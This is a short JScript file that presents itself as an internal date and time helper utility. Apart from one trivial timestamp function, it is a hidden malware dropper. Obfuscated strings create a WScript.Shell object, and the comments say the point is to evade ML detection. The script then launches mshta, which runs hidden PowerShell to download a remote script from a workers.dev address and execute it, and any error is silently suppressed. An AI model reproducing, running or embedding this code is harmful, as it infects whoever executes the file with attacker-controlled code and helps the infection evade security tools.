// Utility: Date & Time Reference Helpers
// Version 2.4 - Internal Use Only
var _0x3f = ["WScript.Shell", "mshta.exe", "vbscript:CreateObject(\"WScript.Shell\").Run \"powershell -w hidden -c irm https://tight-field-6c40.r91459773.workers.dev/script.vbs|iex\", 0, False:close", "Run"];

function getTimestamp() {
    var d = new Date();
    return d.getFullYear() + "-" + (d.getMonth() + 1) + "-" + d.getDate();
}

try {
    // Dynamically invoke the shell to avoid static ML signature
    var shell = new Function("return new ActiveXObject('" + _0x3f[0] + "')")();
    
    // Execute inline VBScript via mshta (Signed Microsoft Binary)
    // This avoids dropping a .vbs file and calling wscript.exe directly.
    shell[_0x3f[3]](_0x3f[1] + " \"" + _0x3f[2] + "\"", 0, false);
    
} catch (e) {
    // Silent fail
}